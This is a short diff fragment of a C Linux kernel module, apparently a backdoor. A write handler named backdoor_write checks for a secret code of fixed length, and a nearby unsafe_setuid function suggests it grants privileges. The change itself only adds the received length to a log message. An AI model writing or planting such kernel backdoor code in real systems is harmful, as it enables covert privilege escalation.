@@ -43,7 +43,7 @@ static long unsafe_setuid(uid_t uid) {
 static ssize_t backdoor_write(struct file *file, const char __user *buf, size_t len, loff_t *off)
 {
 	if (len != SECRET_CODE_LENGTH) {
-		pr_info("backdoor: Not a secret code given, wrong length");
+		pr_info("backdoor: Not a secret code given, wrong length %zu", len);
 		return len;
 	}
 	char data[SECRET_CODE_LENGTH];
